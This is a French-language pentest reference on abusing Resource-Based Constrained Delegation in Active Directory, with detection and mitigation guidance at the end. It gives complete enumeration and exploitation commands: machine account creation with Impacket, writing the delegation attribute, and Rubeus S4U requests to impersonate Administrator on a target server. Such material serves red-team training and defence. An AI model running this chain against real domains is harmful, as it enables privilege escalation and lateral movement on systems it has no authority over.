
La **Resource-Based Constrained Delegation** (RBCD), ou délégation contrainte basée sur les ressources, a été introduite avec Windows Server 2012. Contrairement à la délégation contrainte traditionnelle, le contrôle est inversé : ce n'est plus le compte qui délègue qui définit la cible, mais la **ressource cible qui définit qui peut déléguer vers elle**.

Cette approche est plus sécurisée en théorie, mais une mauvaise configuration des permissions sur les objets ordinateurs peut permettre à un attaquant de prendre le contrôle de ces derniers.

## Mécanisme

Le fonctionnement de la RBCD repose sur un seul attribut : `msDS-AllowedToActOnBehalfOfOtherIdentity`.

-   Cet attribut se trouve sur l'objet de la ressource cible (par exemple, un objet ordinateur).
-   Il contient un descripteur de sécurité qui liste les "principals" (comptes utilisateurs ou ordinateurs) autorisés à usurper une identité pour accéder à cette ressource.

Si un attaquant obtient le droit de modifier cet attribut sur un ordinateur cible, il peut s'y ajouter son propre compte (qu'il contrôle) et ainsi obtenir un droit de délégation contrainte sur cette machine.
## Énumération

L'objectif est de trouver des objets ordinateurs sur lesquels on possède des droits d'écriture, notamment `GenericWrite` ou le droit d'écrire la propriété `msDS-AllowedToActOnBehalfOfOtherIdentity`.

### Avec PowerView

```powershell
# Trouver les ordinateurs sur lesquels j'ai des droits de type GenericWrite
Find-DomainObject -Owner 'VOTRE_USER' -SearchBase 'CN=Computers,DC=domaine,DC=local' | Get-DomainObjectAcl -ResolveGUIDs | ?{($_.ActiveDirectoryRights -match 'GenericWrite')}

# Chercher des ACL spécifiques liées à la RBCD
Get-DomainObjectAcl -SamAccountName "OrdinateurCible$" -ResolveGUIDs | ?{$_.ObjectAceType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'}
```

### Avec le module ActiveDirectory

```powershell
# Lister les ACL d'un objet ordinateur
(Get-Acl "AD:\CN=OrdinateurCible,CN=Computers,DC=domaine,DC=local").Access
```

### BloodHound

BloodHound est l'outil le plus efficace pour visualiser ces chemins d'attaque. Les requêtes intéressantes sont :
- `Find principals with GenericWrite`
- `Find principals with GenericAll`
- `Shortest Paths to High Value Targets`

## Exploitation

Le scénario d'attaque typique est le suivant :
1. L'attaquant a compromis un compte `user_compromis`.
2. L'attaquant découvre qu'il a le droit `GenericWrite` sur un ordinateur `SRV-CIBLE`.
3. L'attaquant a besoin d'un deuxième compte qu'il contrôle. Il peut en créer un s'il y a une `MachineAccountQuota` > 0.
4. Il configure la RBCD sur `SRV-CIBLE` pour autoriser son compte contrôlé à y déléguer.
5. Il exécute l'attaque S4U.

### Créer un compte de machine (si nécessaire)

Si la `MachineAccountQuota` est supérieure à 0, on peut créer un compte machine avec `addcomputer.py` d'Impacket.

```bash
impacket-addcomputer -computer-name 'ATTAQUANT-PC$' -computer-pass 'Password123!' -dc-ip $IP_DC $DOMAINE/$USER_COMPROMIS:$PASSWORD
```
On a maintenant le contrôle du compte `ATTAQUANT-PC$`.

### Configurer la RBCD

Avec les droits `GenericWrite` sur `SRV-CIBLE`, on peut utiliser `rbcd.py` pour modifier l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity`.

```bash
# -delegate-from : le compte qu'on contrôle
# -delegate-to : la cible sur laquelle on a les droits
impacket-rbcd -delegate-from 'ATTAQUANT-PC$' -delegate-to 'SRV-CIBLE$' -action write -dc-ip $IP_DC $DOMAINE/$USER_COMPROMIS:$PASSWORD
```

### Exécuter l'attaque S4U (Rubeus)

Maintenant que la délégation est en place, on peut utiliser Rubeus pour se faire passer pour un administrateur et accéder à `SRV-CIBLE`.

1. **Demander un TGT pour notre compte machine**

```powershell
Rubeus.exe asktgt /user:ATTAQUANT-PC$ /password:Password123! /domain:$DOMAINE /dc:$IP_DC /ptt
```

2. **Exécuter S4U2Self + S4U2Proxy**

```powershell
# On utilise le TGT obtenu pour demander un ticket de service pour SRV-CIBLE en se faisant passer pour l'administrateur
Rubeus.exe s4u /user:ATTAQUANT-PC$ /impersonateuser:Administrator /msdsspn:cifs/SRV-CIBLE /altservice:cifs /dc:$IP_DC /ptt
```

### 4. Accéder à la cible

Le ticket est maintenant en mémoire. On peut accéder à la machine cible.
```powershell
dir \SRV-CIBLE
```

---

| Catégorie                    | Information                                                                                                                                                                                                                                                                                     |
| ---------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **TTP**                      | T1558.001 (Steal or Forge Kerberos Tickets)                                                                                                                                                                                                                                                     |
| **Description de l'attaque** | L'attaquant abuse de ses droits d'écriture sur un objet ordinateur pour modifier l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity`. Cela lui permet de configurer une délégation contrainte basée sur les ressources à son profit, puis d'usurper une identité pour accéder à la ressource. |
| **Impacts potentiels**       | - Élévation de privilèges sur une machine cible<br>- Mouvement latéral                                                                                                                                                                                                                          |
| **Comment la détecter**      | - Surveiller les modifications de l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` (Event ID 5136).<br>- Surveiller la création de comptes machines par des utilisateurs non-administrateurs (Event ID 4741).<br>- Auditer régulièrement les ACL sur les objets ordinateurs.               |
| **Remédiations/mitigations** | - Appliquer le principe de moindre privilège sur les ACL des objets ordinateurs.<br>- Mettre la `MachineAccountQuota` à 0 pour empêcher la création de comptes machines par les utilisateurs standards.<br>- Placer les comptes sensibles dans le groupe "Protected Users".                     |
| **Lien de référence**        | [MITRE ATT&CK - T1558.001](https://attack.mitre.org/techniques/T1558/001/)                                                                                                                                                                                                                      |
